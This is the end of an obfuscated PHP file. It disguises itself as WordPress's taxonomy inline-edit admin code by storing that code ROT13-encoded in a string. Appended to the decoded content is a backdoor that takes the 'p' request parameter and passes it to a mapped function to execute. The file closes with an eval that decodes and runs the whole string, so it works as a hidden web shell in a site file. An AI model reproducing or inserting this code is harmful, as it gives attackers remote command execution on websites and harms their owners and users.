				<?cuc jc_abapr_svryq( 'gnkvayvarrqvgabapr', '_vayvar_rqvg', snyfr ); ?>
				<vachg glcr=\"uvqqra\" anzr=\"gnkbabzl\" inyhr=\"<?cuc rpub rfp_ngge( $guvf->fperra->gnkbabzl ); ?>\" />
				<vachg glcr=\"uvqqra\" anzr=\"cbfg_glcr\" inyhr=\"<?cuc rpub rfp_ngge( $guvf->fperra->cbfg_glcr ); ?>\" />

				<?cuc
				jc_nqzva_abgvpr(
					'<c pynff=\"reebe\"></c>',
					neenl(
						'glcr'               => 'reebe',
						'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'vayvar', 'uvqqra' ),
						'cnentencu_jenc'     => snyfr,
					)
				);
				?>
			</qvi>
			</qvi>

			</gq></ge>

		</gobql></gnoyr>
		</sbez>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>